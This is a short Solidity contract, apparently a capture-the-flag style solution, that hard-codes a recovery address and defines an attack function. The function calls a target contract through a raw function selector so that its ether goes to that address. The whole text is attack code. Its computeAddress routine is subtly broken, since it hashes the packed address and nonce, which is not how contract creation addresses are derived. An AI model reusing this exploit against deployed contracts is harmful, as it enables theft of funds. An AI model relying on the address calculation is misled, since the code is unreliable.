pragma solidity ^0.8.0;

contract CheckToken {
    address immutable recovery = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address public calculatedToken;

    constructor() {
        calculatedToken = computeAddress(recovery, uint8(1));
    }

    function computeAddress(address a, uint8 n) private pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(a, n));
        return address(uint160(uint256(hash)));
    }

    function attack(address payable target) external {
        (bool success, ) = target.call(abi.encodeWithSelector(bytes4(0x87335b7a), payable(recovery)));
        require(success, "Attack failed");
    }
}
